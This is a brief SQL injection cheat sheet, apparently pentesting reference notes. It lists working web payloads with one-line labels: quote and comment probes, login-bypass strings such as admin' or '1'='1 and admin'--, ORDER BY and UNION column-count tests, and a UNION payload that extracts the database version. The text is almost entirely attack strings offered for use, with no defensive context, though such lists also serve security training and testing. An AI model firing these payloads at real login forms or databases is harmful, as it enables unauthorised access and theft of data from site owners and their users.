SQL Injection Commands Cheat Sheet
Basic Discovery Payloads:

' - Single quote to test for errors
" - Double quote
# - Hash comment
; - Semicolon
) - Closing parenthesis

Authentication Bypass:

admin' or '1'='1 - OR injection
admin'--  - Comment out password check
admin')--  - Close parenthesis and comment
' or '1'='1 - Direct bypass

Column Detection:

' order by 1--  - Test column count with ORDER BY
cn' UNION select 1,2,3,4--  - Test with UNION

Information Gathering:

@@version - Get database version
cn' UNION select 1,@@version,3,4--  - Version in UNION

Comments:

--  - Line comment (with space)
# - Line comment
/**/ - Inline comment
